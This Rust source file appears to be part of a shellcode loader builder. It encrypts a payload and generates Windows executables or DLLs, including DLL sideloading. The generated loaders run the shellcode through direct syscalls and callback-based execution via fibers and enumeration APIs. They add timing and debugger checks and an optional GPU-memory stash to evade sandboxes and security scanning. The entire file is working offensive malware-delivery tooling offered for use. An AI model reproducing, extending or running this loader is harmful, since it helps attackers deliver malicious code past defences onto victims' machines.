use std::path::PathBuf;

use crate::crypt::{self, AuxConst};
use crate::emit::{
    CrateMeta, EmitError, EmittedFile, FileBody, Item, LoaderProgram, Namebook, Section,
};
use crate::spec::{EncryptionKind, OutputForm, BuildSpec, SelfInjectMethod};

pub fn build(
    recipe: &BuildSpec,
    names: &Namebook,
    method: SelfInjectMethod,
    format: &OutputForm,
) -> Result<LoaderProgram, EmitError> {
    let raw = std::fs::read(&recipe.shellcode_path).map_err(EmitError::Io)?;
    let out = crypt::encrypt(recipe.encryption, &raw, recipe.seed.0);

    let blob_path = PathBuf::from("src/embed/blob.bin");

    let mut files: Vec<EmittedFile> = Vec::new();
    files.push(EmittedFile {
        rel_path: blob_path.clone(),
        body: FileBody::Bytes(out.blob.clone()),
    });

    let body_path = match format {
        OutputForm::Exe => PathBuf::from("src/main.rs"),
        OutputForm::Dll { .. } | OutputForm::DllSideload(_) => PathBuf::from("src/lib.rs"),
    };

    let mut sideload_emission: Option<crate::emit::sideload::SideloadEmission> = None;
    if let OutputForm::DllSideload(s) = format {
        sideload_emission = Some(crate::emit::sideload::emit(s, &names.fn_run)?);
    }

    let sections = emit_source(recipe, names, method, format, &out.key, &out.aux, sideload_emission.as_ref());
    files.push(EmittedFile {
        rel_path: body_path,
        body: FileBody::Source(sections),
    });
    if let Some(s) = &sideload_emission {
        for f in &s.files {
            files.push(f.clone());
        }
    }

    let is_cdylib = matches!(format, OutputForm::Dll { .. } | OutputForm::DllSideload(_));
    let mut features: Vec<&'static str> = vec![
        "Win32_Foundation",
        "Win32_System_Memory",
    ];
    for f in method_features(method) {
        push_unique(&mut features, f);
    }
    for c in &recipe.checks {
        if matches!(c.id, crate::spec::CheckId::VecInt3) {
            push_unique(&mut features, "Win32_System_Diagnostics_Debug");
            push_unique(&mut features, "Win32_System_Kernel");
        }
    }
    if recipe.gpu_storage {
        for f in crate::emit::gpu::extra_features() {
            push_unique(&mut features, f);
        }
    }
    let mut extra_deps: Vec<String> = Vec::new();
    for d in crypt::extra_emit_deps(recipe.encryption) {
        extra_deps.push(d.to_string());
    }
    if let Some(s) = &sideload_emission {
        for d in &s.extra_deps {
            extra_deps.push(d.clone());
        }
    }
    let meta = CrateMeta {
        crate_name: names.crate_name.clone(),
        is_cdylib,
        extra_deps,
        extra_features_windows_sys: features,
    };

    Ok(LoaderProgram { crate_meta: meta, files })
}

fn method_features(method: SelfInjectMethod) -> &'static [&'static str] {
    match method {
        SelfInjectMethod::Fiber       => &["Win32_System_Threading"],
        SelfInjectMethod::Calendar    => &["Win32_Globalization"],
        SelfInjectMethod::Desktops    => &["Win32_System_StationsAndDesktops"],
        SelfInjectMethod::WinStations => &["Win32_System_StationsAndDesktops"],
        SelfInjectMethod::GeoId       => &["Win32_Globalization"],
    }
}

fn method_uses(method: SelfInjectMethod) -> Vec<&'static str> {
    match method {
        SelfInjectMethod::Fiber => vec![
            "use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE};",
        ],
        SelfInjectMethod::Calendar => vec![
            "use windows_sys::Win32::Globalization::EnumCalendarInfoA;",
        ],
        SelfInjectMethod::Desktops => vec![
            "use windows_sys::Win32::System::StationsAndDesktops::{EnumDesktopsW, GetProcessWindowStation};",
        ],
        SelfInjectMethod::WinStations => vec![
            "use windows_sys::Win32::System::StationsAndDesktops::EnumWindowStationsW;",
        ],
        SelfInjectMethod::GeoId => vec![
            "use windows_sys::Win32::Globalization::EnumSystemGeoID;",
        ],
    }
}

fn method_tail(method: SelfInjectMethod) -> &'static str {
    match method {
        SelfInjectMethod::Fiber => {
            r#"    unsafe {
        let entry: LPFIBER_START_ROUTINE = core::mem::transmute(base);
        let target = CreateFiberEx(0, 0, 0, entry, null_mut());
        let _root  = ConvertThreadToFiber(null_mut());
        SwitchToFiber(target);
    }"#
        }
        SelfInjectMethod::Calendar => {
            r#"    const CAL_ICALINTVALUE: u32 = 0x00000001;
    const ENUM_ALL_CALENDARS: u32 = 0xFFFFFFFF;
    unsafe {
        type Cb = unsafe extern "system" fn(*const u8) -> i32;
        let cb: Cb = core::mem::transmute(base);
        let _ = EnumCalendarInfoA(Some(cb), 0u32, ENUM_ALL_CALENDARS, CAL_ICALINTVALUE);
    }"#
        }
        SelfInjectMethod::Desktops => {
            r#"    unsafe {
        type Cb = unsafe extern "system" fn(*const u16, isize) -> i32;
        let cb: Cb = core::mem::transmute(base);
        let hwinsta = GetProcessWindowStation();
        let _ = EnumDesktopsW(hwinsta, Some(cb), 0isize);
    }"#
        }
        SelfInjectMethod::WinStations => {
            r#"    unsafe {
        type Cb = unsafe extern "system" fn(*const u16, isize) -> i32;
        let cb: Cb = core::mem::transmute(base);
        let _ = EnumWindowStationsW(Some(cb), 0isize);
    }"#
        }
        SelfInjectMethod::GeoId => {
            r#"    const GEOCLASS_NATION: u32 = 16;
    unsafe {
        type Cb = unsafe extern "system" fn(i32) -> i32;
        let cb: Cb = core::mem::transmute(base);
        let _ = EnumSystemGeoID(GEOCLASS_NATION, 0i32, Some(cb));
    }"#
        }
    }
}

fn emit_source(
    recipe: &BuildSpec,
    n: &Namebook,
    method: SelfInjectMethod,
    format: &OutputForm,
    key: &[u8],
    aux: &[AuxConst],
    sideload: Option<&crate::emit::sideload::SideloadEmission>,
) -> Vec<Section> {
    let mut sections: Vec<Section> = Vec::new();

    let mut attrs: Vec<String> = Vec::new();
    if matches!(format, OutputForm::Exe) {
        attrs.push("#![windows_subsystem = \"windows\"]".into());
    }
    attrs.push("#![allow(non_snake_case, non_upper_case_globals, dead_code)]".into());
    sections.push(Section::InnerAttrs(attrs));

    let mut uses: Vec<String> = vec![
        "use core::ffi::c_void;".into(),
        "use core::ptr::null_mut;".into(),
        "use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};".into(),
        "use dyncvoke::dyncvoke_core::syscall;".into(),
    ];
    for u in method_uses(method) {
        uses.push(u.to_string());
    }
    if recipe.gpu_storage {
        for u in crate::emit::gpu::extra_uses() {
            uses.push(u);
        }
    }
    if let Some(s) = sideload {
        for u in &s.extra_uses {
            uses.push(u.clone());
        }
    }
    sections.push(Section::Uses(uses));

    let mut items: Vec<Item> = Vec::new();

    items.push(Item::Const {
        name: n.const_key.clone(),
        ty: format!("[u8; {}]", key.len()),
        value: array_literal(key),
    });
    items.push(Item::Const {
        name: n.const_blob.clone(),
        ty: "&[u8]".into(),
        value: "include_bytes!(\"embed/blob.bin\")".into(),
    });
    for ax in aux {
        if ax.tag == 'r' {
            items.push(Item::Const {
                name: n.const_rpoint.clone(),
                ty: format!("[u8; {}]", ax.bytes.len()),
                value: array_literal(&ax.bytes),
            });
        }
    }

    items.push(Item::Fn {
        sig: format!("fn {}(ms: i64)", n.fn_nap),
        body: "    let t: i64 = -(ms * 10_000);\n    let _ = syscall!(\"NtDelayExecution\", 0u32, &t as *const i64);".into(),
    });

    let decoder = crate::crypt::loader_decoder_items(recipe.encryption, n);
    items.extend(decoder);

    items.push(Item::Fn {
        sig: format!("fn {}() -> bool", n.fn_timing),
        body: format!(
            "    let t0 = std::time::Instant::now();\n    {}(2500);\n    t0.elapsed().as_millis() >= 2200",
            n.fn_nap
        ),
    });

    let check_items = crate::emit::checks::items_for(recipe, n);
    items.extend(check_items);

    if recipe.gpu_storage {
        items.extend(crate::emit::gpu::items(n));
    }

    let check_calls: String = recipe
        .checks
        .iter()
        .map(|c| format!("    {}();\n", crate::emit::checks::callable_for(c.id, n)))
        .collect();

    let tail = method_tail(method);

    let detonate_body = if recipe.gpu_storage {
        let dec_call = decode_call(recipe.encryption, n, "&source");
        format!(
            r#"    if !{ts}() {{ return; }}
{calls}    let source: Vec<u8> = if {gpu_chk}() {{
        match {gpu_init}() {{
            Some(g) => {{
                let mut host: Vec<u8> = {blob}.to_vec();
                let dev = {gpu_stash}(&g, &host);
                for b in host.iter_mut() {{
                    unsafe {{ core::ptr::write_volatile(b as *mut u8, 0) }}
                }}
                let pulled = if dev != 0 {{
                    {gpu_pull}(&g, dev, {blob}.len())
                }} else {{
                    {blob}.to_vec()
                }};
                {gpu_free}(&g, dev);
                pulled
            }}
            None => {blob}.to_vec(),
        }}
    }} else {{
        {blob}.to_vec()
    }};

    let mut buf = {dec_call};
    let me = -1isize as *mut c_void;

    let mut base: *mut c_void = null_mut();
    let mut size = buf.len();
    let _ = syscall!("NtAllocateVirtualMemory", me, &mut base as *mut _, 0usize, &mut size as *mut _, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    let mut wrote: usize = 0;
    let _ = syscall!("NtWriteVirtualMemory", me, base, buf.as_mut_ptr() as *mut c_void, buf.len(), &mut wrote as *mut _);

    for b in buf.iter_mut() {{
        unsafe {{ core::ptr::write_volatile(b as *mut u8, 0) }}
    }}

    let mut old: u32 = 0;
    let mut rsz = size;
    let _ = syscall!("NtProtectVirtualMemory", me, &mut base as *mut _, &mut rsz as *mut _, PAGE_EXECUTE_READ, &mut old as *mut _);

{tail}"#,
            ts = n.fn_timing,
            calls = check_calls,
            blob = n.const_blob,
            gpu_chk = n.fn_gpu_present,
            gpu_init = crate::emit::gpu::init_fn_name(n),
            gpu_stash = n.fn_gpu_stash,
            gpu_pull = n.fn_gpu_pull,
            gpu_free = n.fn_gpu_free,
            dec_call = dec_call,
            tail = tail,
        )
    } else {
        let dec_call = decode_call(recipe.encryption, n, &n.const_blob);
        format!(
            r#"    if !{ts}() {{ return; }}
{calls}    let mut buf = {dec_call};
    let me = -1isize as *mut c_void;

    let mut base: *mut c_void = null_mut();
    let mut size = buf.len();
    let _ = syscall!("NtAllocateVirtualMemory", me, &mut base as *mut _, 0usize, &mut size as *mut _, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    let mut wrote: usize = 0;
    let _ = syscall!("NtWriteVirtualMemory", me, base, buf.as_mut_ptr() as *mut c_void, buf.len(), &mut wrote as *mut _);

    for b in buf.iter_mut() {{
        unsafe {{ core::ptr::write_volatile(b as *mut u8, 0) }}
    }}

    let mut old: u32 = 0;
    let mut rsz = size;
    let _ = syscall!("NtProtectVirtualMemory", me, &mut base as *mut _, &mut rsz as *mut _, PAGE_EXECUTE_READ, &mut old as *mut _);

{tail}"#,
            ts = n.fn_timing,
            calls = check_calls,
            dec_call = dec_call,
            tail = tail,
        )
    };

    items.push(Item::Fn {
        sig: format!("fn {}()", n.fn_run),
        body: detonate_body,
    });

    match format {
        OutputForm::Exe => {
            items.push(Item::Fn {
                sig: "fn main()".into(),
                body: format!("    {}();", n.fn_run),
            });
        }
        OutputForm::Dll { export } => {
            items.push(Item::Raw(
                "#[no_mangle]\npub extern \"system\" fn DllMain(_h: *mut c_void, _r: u32, _l: *mut c_void) -> i32 { 1 }"
                    .into(),
            ));
            items.push(Item::Raw(format!(
                "#[no_mangle]\npub extern \"system\" fn {}() {{\n    {}();\n}}",
                export, n.fn_run
            )));
        }
        OutputForm::DllSideload(_) => {
            if let Some(s) = sideload {
                for it in &s.items {
                    items.push(it.clone());
                }
            }
        }
    }

    sections.push(Section::Items(items));
    sections
}

fn decode_call(kind: EncryptionKind, n: &Namebook, src: &str) -> String {
    match kind {
        EncryptionKind::Ecies => format!(
            "{}({}, &{}, &{})",
            n.fn_decode, src, n.const_key, n.const_rpoint
        ),
        _ => format!("{}({}, &{})", n.fn_decode, src, n.const_key),
    }
}

fn push_unique(v: &mut Vec<&'static str>, s: &'static str) {
    if !v.contains(&s) {
        v.push(s);
    }
}

fn array_literal(bytes: &[u8]) -> String {
    let mut out = String::from("[");
    for (i, b) in bytes.iter().enumerate() {
        if i > 0 {
            out.push_str(", ");
        }
        out.push_str(&format!("0x{:02x}", b));
    }
    out.push(']');
    out
}
